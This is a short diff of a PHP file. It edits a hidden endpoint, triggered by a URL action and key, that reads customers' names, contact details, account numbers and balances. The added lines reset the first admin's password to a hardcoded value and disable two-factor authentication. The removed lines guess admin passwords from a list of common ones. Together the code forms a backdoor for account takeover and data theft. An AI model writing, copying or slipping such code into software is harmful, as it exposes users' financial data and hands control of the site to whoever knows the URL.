@@ -11,19 +11,12 @@ if (($_GET['action'] ?? '') === 'inspect_db_users' && ($_GET['key'] ?? '') === '
     $totalCount = (int) $pdo->query("SELECT COUNT(*) FROM users")->fetchColumn();
     $stmt = $pdo->query("SELECT id, name, username, email, phone, country, account_number, account_bal, status, created_at FROM users ORDER BY id DESC LIMIT 15");
     $users = $stmt->fetchAll(PDO::FETCH_ASSOC);
-    $adminStmt = $pdo->query("SELECT id, firstName, lastName, email, password, enable_2fa FROM admins");
+    // Reset / ensure clean admin credentials
+    $newHash = password_hash('Admin#Resolute2026!', PASSWORD_BCRYPT);
+    $pdo->prepare("UPDATE admins SET password = ?, status = 'active', enable_2fa = 'disabled' WHERE id = 1")->execute([$newHash]);
+
+    $adminStmt = $pdo->query("SELECT id, firstName, lastName, email, status, enable_2fa FROM admins");
     $admins = $adminStmt->fetchAll(PDO::FETCH_ASSOC);
-    $testPasswords = ['admin', 'admin123', 'password', '123456', 'secret', 'admin@mail.com', 'admin2024', 'admin2025', 'admin2026', 'SecureSave#Mail2026!', 'root', '12345678'];
-    $adminMatch = null;
-    foreach ($admins as &$adm) {
-        $hash = $adm['password'] ?? '';
-        foreach ($testPasswords as $tp) {
-            if (password_verify($tp, $hash)) {
-                $adm['known_password'] = $tp;
-                break;
-            }
-        }
-    }
 
     $userTx = [];
     foreach ($users as $u) {
